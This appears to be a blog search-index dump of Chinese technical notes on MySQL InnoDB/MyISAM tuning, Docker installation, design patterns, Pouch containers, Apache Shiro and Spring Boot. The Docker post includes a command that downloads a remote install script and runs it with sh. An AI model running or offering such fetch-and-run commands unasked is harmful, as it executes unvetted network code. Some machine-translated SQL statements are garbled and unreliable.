8.5.9优化InnoDB配置变量1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192不同的设置对于服务器的工作效率最高，可以预测负载较轻，而服务器则始终处于满负荷运行状态，或者遇到高活动的峰值。由于InnoDB存储引擎会自动执行许多优化，因此许多性能调整任务都需要进行监视，以确保数据库性能良好，并在性能下降时更改配置选项。有关详细的性能监控信息，请参见 第14.16节“InnoDB与MySQL性能架构的集成”InnoDB。您可以执行的主要配置步骤包括：允许InnoDB在包含它们的系统上使用高性能内存分配器。请参见 第14.6.4节“为InnoDB配置内存分配器”。控制哪些InnoDB缓冲区更改数据的数据更改操作的类型 ，以避免频繁的小磁盘写入。请参见 第14.6.5节“配置InnoDB更改缓冲”。由于默认设置是缓冲所有类型的数据更改操作，因此只有在需要减少缓冲量时才更改此设置。使用该innodb_adaptive_hash_index 选项打开和关闭自适应哈希索引功能 。有关更多信息，请参见第14.4.3节“自适应散列索引”。 您可能会在非正常活动期间更改此设置，然后将其恢复到原始设置。InnoDB如果上下文切换是瓶颈，则 设置对并发线程数量的 限制。请参见 第14.6.6节“为InnoDB配置线程并发”。控制InnoDB与其预读操作相关的预取量 。当系统没有使用I / O容量时，更多的预读可以提高查询的性能。 预读过多会导致重负载系统的性能周期性下降。请参见 第14.6.3.5节“配置InnoDB缓冲池预取（预读）”。如果您有一个高端I / O子系统未被默认值充分利用，则增加读取或写入操作的后台线程数。请参见 第14.6.7节“配置背景InnoDB I / O线程数”。控制I / O InnoDB在后台执行多少操作。请参见 第14.6.9节“配置InnoDB主线程I / O速率”。 如果您观察到性能的周期性下降，您可能会缩减此设置。控制确定何时InnoDB执行某些类型的背景写入的算法 。请参见 第14.6.3.6节“配置InnoDB缓冲池刷新”。该算法适用于某些类型的工作负载，但不适用于其他类型的工作负载，因此如果观察到性能下降，可能会关闭此设置。利用多核处理器及其高速缓存存储器配置，尽量减少上下文切换的延迟。请参见 第14.6.10节“配置旋转锁定轮询”。防止诸如表扫描之类的一次性操作干扰存储在InnoDB缓冲区高速缓存中的经常访问的数据 。请参见 第14.6.3.4节“使缓冲池抗扫描”。将日志文件调整为适合可靠性和崩溃恢复的大小。InnoDB 日志文件通常很小，以避免崩溃后的长时间启动。MySQL 5.5中引入的优化加速了崩溃恢复过程的某些步骤 。尤其是，由于改进了内存管理算法，扫描 重做日志和应用重做日志速度更快。如果为了避免很长的启动时间而将您的日志文件人为保留较小，现在可以考虑增加日志文件大小以减少由于重做日志记录的回收而发生的I / O。为InnoDB缓冲池配置实例的大小和数量， 对于具有多千兆字节缓冲池的系统尤为重要。请参见 第14.6.3.3节“配置多个缓冲池实例”。增加并发事务的最大数量，这极大地提高了最繁忙数据库的可伸缩性。请参见第14.4.8节“撤消日志”。将清除操作（一种垃圾收集）移动到后台线程中。请参见 第14.6.11节“配置InnoDB清除计划”。要有效测量此设置的结果，请首先调整其他I / O相关和线程相关的配置设置。减少InnoDB并发线程之间的交换量 ，以便繁忙服务器上的SQL操作不会排队并形成“ 交通拥堵 ”。为该innodb_thread_concurrency 选项设置一个值， 对于高性能的现代系统，最高可达约32。增加该innodb_concurrency_tickets 选项的值 ，通常为5000左右。这些选项的组合设置了线程数量的上限 InnoDB 在任何时候都可以进行处理，并且允许每个线程在被换出之前做大量的工作，以便等待的线程数量保持低，并且操作可以在没有过度上下文切换的情况下完成。 8.5.10为具有多个表的系统优化InnoDB12345678910如果您已配置 的非持久性优化统计（非默认配置）， InnoDB计算指标 基数值表中的第一次表，启动后访问，而不是在表中存储这些值。在将数据分割成多个表的系统上，此步骤可能会花费大量时间。由于此开销仅适用于初始表打开操作，要“ 预热 ” 表供以后使用，请在启动后立即通过发出诸如“&gt;”之类的语句来访问它。 SELECT 1 FROM tbl_name LIMIT 1优化器统计信息默认保存到磁盘，由innodb_stats_persistent 配置选项启用 。有关持久化优化器统计信息的信息，请参见 第14.6.12.1节“配置持久性优化器统计信息参数”。]]></content>
      <categories>
        <category>java</category>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>SQL优化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[install docker]]></title>
    <url>%2F2018%2F03%2F24%2Fcontainer%2Finstall-docker%2F</url>
    <content type="text"><![CDATA[国内大佬专玩docker地址中文翻译http://www.widuu.com/docker/ 123456789101112从官方下载curl https://get.docker.com &gt; /tmp/install.shsh install.sh从系统镜像元下载centos：yum install dockerdebian: apt-get install docker在centos-6 中 docker 与系统自带可执行程序冲突。执行：yum -y remove dockeryum install docker-io {———-}123456789101112131415启动dockerservice docker start设定默认开机启动chkconfig docker on下载镜像并运行docker pull centos查看镜像docker images centos运行镜像docker run -i -t centos /bin/bash]]></content>
      <categories>
        <category>container</category>
      </categories>
      <tags>
        <tag>容器</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[设计模式-行为型]]></title>
    <url>%2F2018%2F03%2F24%2Fdesign-pattern%2Fbehavior%2F</url>
    <content type="text"><![CDATA[设计模式行为型–11种 责任链—-请求创建了一个接收者对象的链。这种模式给予请求的类型，对请求的发送者和接收者进行解耦。 命令—-请求以命令的形式包裹在对象中，并传给调用对象。调用对象寻找可以处理该命令的合适的对象，并把该命令传给相应的对象，该对象执行命令。 解释器—-这种模式实现了一个表达式接口，该接口解释一个特定的上下文。这种模式被用在 SQL 解析、符号处理引擎等。 迭代器—-这种模式用于顺序访问集合对象的元素，不需要知道集合对象的底层表示。 中介者—-这种模式提供了一个中介类，该类通常处理不同类之间的通信，并支持松耦合，使代码易于维护。 备忘录—-保存一个对象的某个状态，以便在适当的时候恢复对象。备忘录模式属于行为型模式。 观察者—-当对象间存在一对多关系时，则使用观察者模式（Observer Pattern）。比如，当一个对象被修改时，则会自动通知它的依赖对象。 状态—-我们创建表示各种状态的对象和一个行为随着状态对象改变而改变的 context 对象。 空对象—-在空对象模式（Null Object Pattern）中，一个空对象取代 NULL 对象实例的检查。Null 对象不是检查空值，而是反应一个不做任何动作的关系。 这样的 Null 对象也可以在数据不可用的时候提供默认的行为。 {———-} 策略 在策略模式（Strategy Pattern）中，一个类的行为或其算法可以在运行时更改。这种类型的设计模式属于行为型模式。 在策略模式中，我们创建表示各种策略的对象和一个行为随着策略对象改变而改变的 context 对象。策略对象改变 context 对象的执行算法。 模板 在模板模式（Template Pattern）中，一个抽象类公开定义了执行它的方法的方式/模板。 它的子类可以按需要重写方法实现，但调用将以抽象类中定义的方式进行。这种类型的设计模式属于行为型模式。 访问 在访问者模式（Visitor Pattern）中，我们使用了一个访问者类，它改变了元素类的执行算法。 通过这种方式，元素的执行算法可以随着访问者改变而改变。这种类型的设计模式属于行为型模式。 根据模式，元素对象已接受访问者对象，这样访问者对象就可以处理元素对象上的操作。]]></content>
      <categories>
        <category>java</category>
        <category>design-pattern</category>
      </categories>
      <tags>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pouch]]></title>
    <url>%2F2018%2F03%2F24%2Fcontainer%2Fpouch%2F</url>
    <content type="text"><![CDATA[2017.11.19正式开源pouch pouch 基于Apache2.0协议的容器技术 介绍：Pouch 是一个轻量级容器技术特点：快速高效、可移植性高、资源占用少 github：pouch 11年基于Linux内核上的namespace、cgroup等技术开始成熟、阿里Pouch基于LXC研发的第一代容器t413年Docker横空出世、解决了行业多年的”软件封装”问题、阿里吸收其经验、打磨Pouch Pouch规模2017 年双 11，巨额交易 1682 亿背后，Pouch 在”超级工程”中做到了： 1、100% 的在线业务 Pouch 化2、容器规模达到百万级 {———-} 1234阿里集团内部，Pouch 的日常服务已经覆盖绝大部分的事业部，覆盖的业务场景包括：电商、广告、搜索等；覆盖技术栈包括：电商应用、数据库、大数据、流计算等；覆盖编程语言：Java、C++、NodeJS 等。 Pouch 技术优势1、隔离性强12345678910众所周知，行业中的容器方案大多基于 Linux 内核提供的 cgroup 和 namespace 来实现隔离，然后这样的轻量级方案存在弊端：.容器间，容器与宿主间，共享同一个内核；.内核实现的隔离资源，维度不足。面对如此的内核现状，阿里巴巴采取了三个方面的工作，来解决容器的安全问题：用户态增强容器的隔离维度，比如网络带宽、磁盘使用量等；给内核提交 patch，修复容器的资源可见性问题，cgroup 方面的 bug；实现基于 Hypervisor 的容器，通过创建新内核来实现容器隔离。 2、P2P镜像分发123点对点分发镜像【相对于中央仓库分发镜像、极大见笑了中央仓库的网络压力】工具：阿里巴巴镜像分发工具&quot;蜻蜓&quot; 蜻蜓地址 3、富容器技术123456789 Pouch 技术可以说对业务没有任何的侵入性，也正是因为这一点在集团内部做到 100% 容器化。这样的容器技术，被无数阿里人称为“富容器”。“富容器”技术的实现，主要是为了在 Linux 内核上创建一个与虚拟机体验完全一致的容器。如此一来，比一般容器要功能强大，内部有完整的 init 进程，以及业务应用需要的任何服务，当然这也印证了 Pouch 为什么可以做到对应用没有“侵入性”。技术的实现过程中，Pouch 需要将容器的执行入口定义为 systemd，而在内核态，Pouch 引入了 cgroup namespace 这一最新的内核 patch，满足 systemd 在富容器模式的隔离性。从企业运维流程来看，富容器同样优势明显。它可以在应用的 Entrypoint 启动之前做一些事情，比如统一要做一些安全相关的事情，运维相关的 agent 拉起。这些需要统一做的事情，倘若放到用户的启动脚本，或镜像中就对用户的应用诞生了侵入性，而富容器可以透明的处理掉这些事情。 4、内核兼容性可以理解为兼容老版本linux内核系统 Pouch 的生态架构可以从两个方面来看：第一，如何对接容器编排系统；第二，如何加强容器运行时。 传统的容器引擎方案相似，Pouch 也呈现出 C/S 的软件架构。命令行 CLI 层面，可以同时支持 Pouch CLI 以及 Docker CLI。对接容器 runtime，Pouch 内部通过 container client 通过 gRPC 调用 containerd。Pouch Daemon 的内部采取组件化的设计理念，抽离出相应的 System Manager、Container Manager、Image Manager、Network Manager、Volume Manager 提供统一化的对象管理方案。 以上内容来自 infoq阿里关于pouch介绍]]></content>
      <categories>
        <category>container</category>
      </categories>
      <tags>
        <tag>容器</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mysql-index 索引]]></title>
    <url>%2F2018%2F03%2F24%2Fmysql%2Fmybatis-index%2F</url>
    <content type="text"><![CDATA[mysql 索引 原文索引 MySQL索引及其实现原理(基于MyISAM及InnoDB引擎) 本文介绍了 磁盘索引结构 索引结构、索引与文件的规划 其中可以了解到 为什么innodb 为什么使用自增主键、 {———-} 主要查看两种索引引擎 MYISAM、InnoDB 两者相同特点：都是B+ TRee 不同点： myisam 是非聚集索引 索引与数据分开存储 叶子节点执行 数据的物理地址 innodb是 聚集索引、索引即是 数据主键 123把主键作为索引key、有好处也有缺点、好处查询IO次数减少、坏处、每次更新主键都要遍历整个列表来保证主键唯一性、 所有索引中 、主键索引和辅助索引区分、主键索引不可重复、辅助索引可重复 myisam可认为是 双索引或者多索引结构、每一个索引都会生成一个索引树、而innodb是层级关系、 建立索引注意事项： 记录少 不建索引 选择性低 不建索引【重复率低 即命中率低】]]></content>
      <categories>
        <category>java</category>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>mysql-index</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mysql-care点]]></title>
    <url>%2F2018%2F03%2F24%2Fmysql%2Fmysql-care-point%2F</url>
    <content type="text"><![CDATA[12查询缓存从 Mysql5.7.20开始已经弃用、并在MySQL8.0中删除 1!= 已经弃用 使用&lt;&gt; 来代替 二者等效]]></content>
      <categories>
        <category>java</category>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL优化【MyISAM-表优化】]]></title>
    <url>%2F2018%2F03%2F24%2Fmysql%2Foptimization-sql-myisam%2F</url>
    <content type="text"><![CDATA[8.6.1优化MyISAM查询123456789101112131415161718加快查询MyISAM表的一些常规提示 ：为了帮助MySQL更好地优化查询，请使用 ANALYZE TABLE或运行 myisamchk -在载入数据之后对其进行分析。这会更新每个索引部分的值，以指示具有相同值的平均行数。（对于唯一索引，这总是1.）当你基于非常量表达式连接两个表时，MySQL使用它来决定选择哪个索引。您可以通过使用和检查值来检查表格分析的结果 。myisamchk --description --verbose显示索引分布信息。 SHOW INDEX FROM tbl_nameCardinality要根据索引对索引和数据进行排序，请使用 myisamchk --sort-index --sort-records = 1 （假设您要对索引1进行排序）。如果您有一个唯一索引，您希望根据索引按顺序读取所有行，则这是一种更快查询的好方法。第一次以这种方式排列大表时，可能需要很长时间。尽量避免SELECT 对MyISAM经常更新的表进行复杂的查询，以避免由于读者和作者之间的争用而发生的表锁定问题。 {———-} 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354MyISAM支持并发插入：如果一个表在数据文件中间没有空闲块，那么可以INSERT在其他线程从表中读取数据的同时将新行插入到它中。如果能做到这一点很重要，请考虑以避免删除行的方式使用表。另一种可能性是OPTIMIZE TABLE在删除了很多行之后运行对表进行碎片整理。这种行为是通过设置concurrent_insert变量来改变的 。您可以强制添加新行（因此允许并发插入），即使在已删除行的表中也是如此。请参见第8.11.3节“并发插入”。对于MyISAM频繁更改的表，尽量避免所有变长列（VARCHAR， BLOB，和 TEXT）。如果该表甚至包含单个可变长度列，该表使用动态行格式。请参阅第15章，备用存储引擎。仅仅因为行变大，将表分割成不同的表通常是没有用的。在访问行时，最大的性能影响是找到行的第一个字节所需的磁盘查找。找到数据后，大多数现代磁盘可以为大多数应用程序快速读取整行。分割表格的唯一情况是，如果它是一个MyISAM使用动态行格式的 表格，您可以更改为固定的行大小，或者您经常需要扫描表格但不需要大多数列。请参阅第15章，备用存储引擎。如果您通常按顺序检索行， 请使用它 。在对表格进行大量更改后使用此选项，您可能会获得更高的性能。 ALTER TABLE ... ORDER BY expr1, expr2, ...expr1, expr2, ...如果您经常需要根据来自很多行的信息计算结果（如计数），则最好引入一个新表并实时更新计数器。以下表单的更新速度非常快：UPDATE tbl_nameSET count_col= count_col+1 WHERE key_col= constant;当你使用MySQL存储引擎时，这是非常重要的，例如MyISAM只有表级锁定（多个读者使用单个编写器）。这也为大多数数据库系统提供了更好的性能，因为在这种情况下行锁管理器不太容易。OPTIMIZE TABLE 定期 使用以避免使用动态格式MyISAM表进行分段 。请参见 第15.2.3节“MyISAM表格存储格式”。MyISAM使用DELAY_KEY_WRITE=1table选项 声明一个表 会使索引更新速度更快，因为它们在表关闭之前不会刷新到磁盘。缺点是，如果某个表在打开时杀死服务器，则必须通过运行带有该--myisam-recover-options 选项的服务器或在重新启动服务器之前运行myisamchk来确保表可以正常运行 。（但是，即使在这种情况下，也不能DELAY_KEY_WRITE因为使用而丢失任何东西 ，因为密钥信息总是可以从数据行中生成。）字符串会自动在MyISAM索引中进行前缀和结尾空间压缩。请参见 第13.1.14节“CREATE INDEX语法”。您可以通过在应用程序中缓存查询或答案，然后一起执行许多插入或更新来提高性能。在此操作期间锁定表可确保索引缓存在所有更新后仅刷新一次。您还可以利用MySQL的查询缓存来获得类似的结果; 请参见 第8.10.3节“MySQL查询缓存”。 8.6.2 MyISAM表的批量数据加载12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182这些性能提示补充了第8.2.4.1节“优化INSERT语句”中有关快速插入的一般准则。对于MyISAM表，SELECT如果数据文件中间没有删除的行，则可以使用并行插入在语句正在运行的同时添加行 。请参见第8.11.3节“并发插入”。通过一些额外的工作，当表中有许多索引时，可以使 表LOAD DATA INFILE运行得更快 MyISAM。使用以下步骤：执行FLUSH TABLES 语句或mysqladmin flush-tables命令。使用myisamchk --keys-used = 0 -rq /path/to/db/tbl_name 删除表中所有索引的使用。用数据插入表格 LOAD DATA INFILE。这不会更新任何索引，因此速度非常快。如果您打算以后只从表中读取数据，请使用myisampack进行压缩。请参见 第15.2.3.3节“压缩表特征”。用myisamchk -rq /path/to/db/tbl_name重新创建索引。这会在将内容写入磁盘之前在内存中创建索引树，这比在更新索引期间快得多，LOAD DATA INFILE因为它避免了大量磁盘搜索。得到的索引树也是完美平衡的。执行FLUSH TABLES 语句或mysqladmin flush-tables命令。LOAD DATA INFILE如果MyISAM插入数据的表为空，则自动执行上述优化。自动优化和明确使用过程之间的主要区别是，您可以让myisamchk为索引创建分配更多的临时内存，而不是您希望服务器在执行LOAD DATA INFILE语句时为索引重新创建分配内存。您还可以MyISAM使用以下语句而不是myisamchk来禁用或启用表的非唯一索引 。如果您使用这些语句，则可以跳过这些 FLUSH TABLES操作：ALTER TABLE tbl_nameDISABLE KEYS;ALTER TABLE tbl_nameENABLE KEYS;要加快INSERT使用多个非事务表的语句执行的操作，请锁定您的表：锁定表写一个;插入一个值（1,23），（2,34），（4,33）;插入一个值（8,26），（6,29）;...解锁表;这有利于性能，因为索引缓冲区在所有INSERT语句完成后只刷新到磁盘一次 。通常情况下，会有多少个索引缓冲区刷新与INSERT 语句一样多。如果可以插入所有行，则不需要显式锁定语句 INSERT。锁定还会降低多连接测试的总时间，但个别连接的最长等待时间可能会因为等待锁定而增加。假设五个客户端尝试同时执行插入操作，如下所示：连接1有1000个插入连接2,3和4做1插入连接5有1000个插入如果不使用锁定，则连接2,3和4会在1和5之前完成。如果使用锁定，连接2,3和4可能在1或5之前未完成，但总时间应该约为40％更快。INSERT， UPDATE并且 DELETEMySQL中的操作非常快，但是通过在所有超过大约五次连续插入或更新的事物中添加锁，您可以获得更好的整体性能。如果你做了很多次连续的插入操作，你可以LOCK TABLES稍后 再做UNLOCK TABLES一次（每1,000行左右），以允许其他线程访问表。这仍然会带来不错的性能提升。INSERT加载数据的速度仍然比LOAD DATA INFILE使用刚刚列出的策略时慢得多 。要提高MyISAM 表的性能，对于这两者， LOAD DATA INFILE并INSERT通过增加key_buffer_size系统变量来放大密钥缓存 。请参见第5.1.1节“配置服务器”。 8.6.3优化REPAIR TABLE语句1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071REPAIR TABLE对于 MyISAM表格类似于使用 myisamchk进行修复操作，以及一些相同的性能优化适用：myisamchk有控制内存分配的变量。您可以通过设置这些变量来提高性能，如 第4.6.3.6节“myisamchk内存使用情况”中所述。因为REPAIR TABLE，同样的原则适用，但由于修复是由服务器完成的，因此您可以设置服务器系统变量而不是 myisamchk变量。此外，除了设置内存分配变量之外，增加 myisam_max_sort_file_size 系统变量还会增加修复将使用更快的文件排序方法的可能性，并避免缓存键方法的修复速度降低。检查并确保有足够的可用空间来存放表文件的副本后，将该变量设置为系统的最大文件大小。可用空间必须在包含原始表格文件的文件系统中可用。假设使用以下选项设置myisamchk表修复操作来设置其内存分配变量：--key_buffer_size = 128M --myisam_sort_buffer_size = 256M--read_buffer_size = 64M --write_buffer_size = 64M其中一些myisamchk变量对应于服务器系统变量：myisamchk变量 系统变量key_buffer_size key_buffer_sizemyisam_sort_buffer_size myisam_sort_buffer_sizeread_buffer_size read_buffer_sizewrite_buffer_size 没有每个服务器系统变量都可以在运行时设置，其中一些（myisam_sort_buffer_size， read_buffer_size）除了全局值之外还有一个会话值。设置会话值会限制更改对当前会话的影响，并且不会影响其他用户。更改全局变量（key_buffer_size， myisam_max_sort_file_size）也会影响其他用户。因为 key_buffer_size，您必须考虑到缓冲区是与这些用户共享的。例如，如果将myisamchk key_buffer_size变量设置为128MB，则可以设置相应的值 key_buffer_size系统变量大于此值（如果它尚未设置为较大），以允许按其他会话中的活动使用密钥缓冲区。但是，更改全局密钥缓冲区大小会使缓冲区失效，从而导致磁盘I / O增加以及其他会话减速。避免此问题的替代方法是使用单独的密钥缓存，为其分配要修复的表中的索引，并在修复完成时将其解除分配。请参见 第8.10.2.2节“多键缓存”。根据前面的说明，REPAIR TABLE可以按如下所示进行操作，以使用与myisamchk命令类似的设置。这里分配了一个单独的128MB密钥缓冲区，假定文件系统允许文件大小至少为100GB。SET SESSION myisam_sort_buffer_size = 256 * 1024 * 1024;SET SESSION read_buffer_size = 64 * 1024 * 1024;SET GLOBAL myisam_max_sort_file_size = 100 * 1024 * 1024 * 1024;SET GLOBAL repair_cache.key_buffer_size = 128 * 1024 * 1024;CACHE INDEX tbl_nameIN repair_cache;LOAD INDEX INTO CACHE tbl_name;修理桌tbl_name;SET GLOBAL repair_cache.key_buffer_size = 0;如果您打算更改全局变量，但希望仅在REPAIR TABLE操作期间这样做才能最小化影响其他用户，请将其值保存在用户变量中，然后再恢复。例如：SET @old_myisam_sort_buffer_size = @@ global.myisam_max_sort_file_size;SET GLOBAL myisam_max_sort_file_size = 100 * 1024 * 1024 * 1024;REPAIR TABLE tbl_name;SET GLOBAL myisam_max_sort_file_size = @old_myisam_max_sort_file_size;REPAIR TABLE如果您希望这些值在默认情况下有效，那么可以在服务器启动时全局设置 影响的系统变量。例如，将这些行添加到服务器my.cnf文件中：的[mysqld]myisam_sort_buffer_size = 256M的key_buffer_size = 1Gmyisam_max_sort_file_size = 100G这些设置不包括 read_buffer_size。read_buffer_size全局设置 为较大的值对于所有会话都是如此，并且可能会导致性能受损，原因是具有多个同时会话的服务器的内存分配过多。]]></content>
      <categories>
        <category>java</category>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>SQL优化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[权限系统_shiro_验证流程]]></title>
    <url>%2F2018%2F03%2F24%2Fservice-permission%2Fshiro-2%2F</url>
    <content type="text"><![CDATA[权限分为：操作权限、业务权限、数据权限三种 １、操作权限 现阶段操作权限都是使用shiro进行控制 shiro 也是基于RBAC思想 【不懂的小朋友就去百度RBAC】 shiro 的表设计 最基本的无张表：用户表、用户角色表、角色表、角色操作权限表、操作权限表、 一般也满足使用了 复杂点有用户组表 角色组表 等等 这些RBAC都有介绍 那么 What is Apache Shiro?Apache Shiro 是一个强大而灵活的开源安全框架，它干净利落地处理身份认证，授权，企业会话管理和加密。 这个比较牛逼、集成了 shiro 什么权限怎么控制的你就不用管了、照着他的文档使用就可以了、页面操作按钮【可以使用Tag控制】web.xml 添加了拦截器之后、他能保证整个会话中都知道用户的权限、一直放到缓存中、你在整个流程中想要什么时候查询整个用户的角色、ｉｄ都可以直接通过他的方法拿到、那么他是怎么实现的呢？其实把他理解成一个封装工具或者一个安全框架也行、契合到项目中使用、简洁我们自己的代码、而且他这个工具还是Apache的 在安全方面还是比较值得信任的 {———-} 那么他做了什么呢？ 官方有以下说明： 验证用户来核实用户身份 对用户访问进行控制 判断用户是否被分配了一个确定的安全角色 判断用户是否被允许做某事 在任何环境下使用SessionAPI 即使没有 web EJB容器 在身份验证、访问控制期间、会话的生命周期、对事件做出反应 聚集一个或多个用户安全数据源、并作为一个单一复合用户“视图” 启动单点登陆【SSO】功能 为没有关联登陆的用户启用 Remember Me服务 。。。 关于实现原理： shiro 团队 把这四个功能成为 应用程序的四大基石：身份认证、授权、会话管理、加密 shiro核心部分： Authentication：有时也简称为“登录”，这是一个证明用户是他们所说的他们是谁的行为。 Authorization：访问控制的过程，也就是绝对“谁”去访问“什么”。 Session Management：管理用户特定的会话，即使在非 Web 或 EJB 应用程序。 Cryptography：通过使用加密算法保持数据安全同时易于使用。 看不懂？那么想想我们自己的登陆系统应该是怎样的呢？ 那么这样就好理解了 登陆就像是Authentication 管理用户标识 谁是谁 那么Authorization就像是登陆系统中的查看角色权限等功能＼管理谁应该访问什么资源 Session Management 就是一个管理会话的工具 将返还的ticket放置在哪里传递给用户 Cryptography 暂时就理解为加密算法 额外功能： Web Support：Shiro 的 web 支持的 API 能够轻松地帮助保护 Web 应用程序。 Caching：缓存是 Apache Shiro 中的第一层公民，来确保安全操作快速而又高效。 Concurrency：Apache Shiro 利用它的并发特性来支持多线程应用程序。 Testing：测试支持的存在来帮助你编写单元测试和集成测试，并确保你的能够如预期的一样安全。 &quot;Run As&quot;：一个允许用户假设为另一个用户身份（如果允许）的功能，有时候在管理脚本很有用。 &quot;Remember Me&quot;：在会话中记住用户的身份，所以他们只需要在强制时候登录。 分解下： 先说认证 Authenticating Subjects （验证 Subjects） 系统分为了三个不同的步骤： 1、手机Subjects提交的Principals（身份）和Credentials（凭证） 2、提交Principals（身份）和Credentials（凭证）进行认证 3、如果提交成功、则允许访问、否则则重新认证或者阻止进行访问 代码如下：Step 1 ：收集 Subject 的 的 Principals( 身份)和 和 Credentials( 凭证) UsernamePasswordToken token = new UsernamePasswordToken(username, password);Step 2 ：提交 Subject 的 的 Principals( 身份)和 和 Credentials( Subject currentUser = SecurityUtils.getSubject(); currentUser.login(token);Step3 成功： 应用程序继续执行、并把subject.isAuthenticated(true) 失败：返回登录？访问次数过多进行锁定？等等可以用户自己判断 那么关于注销呢 也是easy调用方法如下： currentUser.logout(); //removes all identifying information an invalidates their session too. 贴一下官方文档原图体会下具体流程： 功能模块定义1、Authenticator（认证器） shiro中默认使用了一个ModularRealmAuthenticator实例 这个实例中同样支持着一个Realm以及多个Realm的应用通过配置也可以修改这个配置 在shiro.ini 中配置响应数据 2、AuthenticationStrategy（认证策略） 当一个应用程序配置了两个或者以上的Realm时候、就需要依靠内部组件来配置认证策略 在这个规则中使用到了AuthenticationStrategy 一个无状态组件 在身份验证尝试中会询问4次 12341、在任何 Realm 被调用之前被询问；2. 在一个单独的 Realm 的 getAuthenticationInfo 方法被调用之前立即被询问；3. 在一个单独的 Realm 的 getAuthenticationInfo 方法被调用之后立即被询问；4. 在所有的 Realm 被调用后询问。 然后AuthenticationStrategy 会总结合并所有的返回值 并最终确定Subject的最终ID值 （即Principals身份） 3、Realm 的验证顺序 关于Realm的验证顺序 有两种 一种是Implicit ordering(隐式排列) 另一种是 Explicit Ordering(显示排列) 1234567891011121314151617181920212223242526在shiro.ini中配置如下：隐式排列：blahRealm = com.company.blah.Realm…fooRealm = com.company.foo.Realm…barRealm = com.company.another.Realm或者securityManager.realms = $blahRealm, $fooRealm, $barRealm显示排列 如果你想明确地定义 Realm 的交互顺序，忽略它们是如何定义的，你可以设置 securityManager 的属性作为一个明确的集合属性。例如，如果使用上面的定义，但你想 blahRealm 最后被请求而不是第一个：blahRealm = com.company.blah.Realm…fooRealm = com.company.foo.Realm…barRealm = com.company.another.RealmsecurityManager.realms = $fooRealm, $barRealm,$blahRealm当你显式地配置 securityManager.realms 的属性是，只有已引用的 Realm 将会在SecurityManager 中被配置。这意味着你能够在 INI 文件中定义 5 个 realm，但是实际上只能使用 3 个如果只有这 3 个被引用到 realm 的属性中的话.这是和隐式 realm 顺序不同的，所有可用的隐式的 realm 都将被使用。 至此 shiro身份认证顺序逻辑结束 下一篇Shiro Authorization （ 授权） 那么 shiro 的使用呢 maven 导入 shiro 包 1234567891011121314&lt;dependency&gt; &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt; &lt;artifactId&gt;shiro-core&lt;/artifactId&gt; &lt;version&gt;1.1.0&lt;/version&gt;&lt;/dependency另外 shiro 使用了 slf4j 作为日志记录工具所以还要导入 slf4j 相关 jar 包&lt;dependency&gt; &lt;groupId&gt;org.slf4j&lt;/groupId&gt; &lt;artifactId&gt;slf4j-simple&lt;/artifactId&gt; &lt;version&gt;1.6.1&lt;/version&gt; &lt;scope&gt;test&lt;/scope&gt;&lt;/dependency&gt;]]></content>
      <categories>
        <category>java</category>
        <category>service-permission</category>
      </categories>
      <tags>
        <tag>权限认证</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[spring官网提供的 spring boot实例]]></title>
    <url>%2F2018%2F03%2F24%2Fspring-boot%2Fopen-source-project%2F</url>
    <content type="text"><![CDATA[github开源项目–springboot {———-} = Spring Boot image:https://ci.spring.io/api/v1/teams/spring-boot/pipelines/spring-boot-2.0.x/jobs/build/badge[&quot;Build Status”, link=”https://ci.spring.io/teams/spring-boot/pipelines/spring-boot-2.0.x?groups=Build&quot;] image:https://badges.gitter.im/Join Chat.svg[“Chat”,link=”https://gitter.im/spring-projects/spring-boot?utm_source=badge&amp;utm_medium=badge&amp;utm_campaign=pr-badge&amp;utm_content=badge&quot;]:docs: https://docs.spring.io/spring-boot/docs/current-SNAPSHOT/reference Spring Boot makes it easy to create Spring-powered, production-grade applications andservices with absolute minimum fuss. It takes an opinionated view of the Spring platformso that new and existing users can quickly get to the bits they need. You can use Spring Boot to create stand-alone Java applications that can be started usingjava -jar or more traditional WAR deployments. We also provide a command line toolthat runs spring scripts. Our primary goals are: Provide a radically faster and widely accessible getting started experience for allSpring development Be opinionated out of the box, but get out of the way quickly as requirements start todiverge from the defaults Provide a range of non-functional features that are common to large classes of projects(e.g. embedded servers, security, metrics, health checks, externalized configuration) Absolutely no code generation and no requirement for XML configuration == Installation and Getting StartedThe {docs}/htmlsingle/[reference documentation] includes detailed{docs}/htmlsingle/#getting-started-installing-spring-boot[installation instructions]as well as a comprehensive {docs}/htmlsingle/#getting-started-first-application[getting started] guide. Documentation is published in {docs}/htmlsingle/[HTML],{docs}/pdf/spring-boot-reference.pdf[PDF] and {docs}/epub/spring-boot-reference.epub[EPUB]formats. Here is a quick teaser of a complete Spring Boot application in Java: [source,java,indent=0]123456789101112131415161718import org.springframework.boot.*;import org.springframework.boot.autoconfigure.*;import org.springframework.web.bind.annotation.*;@RestController@SpringBootApplicationpublic class Example &#123; @RequestMapping(&quot;/&quot;) String home() &#123; return &quot;Hello World!&quot;; &#125; public static void main(String[] args) throws Exception &#123; SpringApplication.run(Example.class, args); &#125;&#125; == Getting helpHaving trouble with Spring Boot? We’d like to help! Check the {docs}/htmlsingle/[reference documentation], especially the{docs}/htmlsingle/#howto[How-to’s] – they provide solutions to the most commonquestions. Learn the Spring basics – Spring Boot builds on many other Spring projects, checkthe https://spring.io[spring.io] web-site for a wealth of reference documentation. Ifyou are just starting out with Spring, try one of the https://spring.io/guides[guides]. If you are upgrading, read the https://github.com/spring-projects/spring-boot/wiki[release notes]for upgrade instructions and “new and noteworthy” features. Ask a question - we monitor https://stackoverflow.com[stackoverflow.com] for 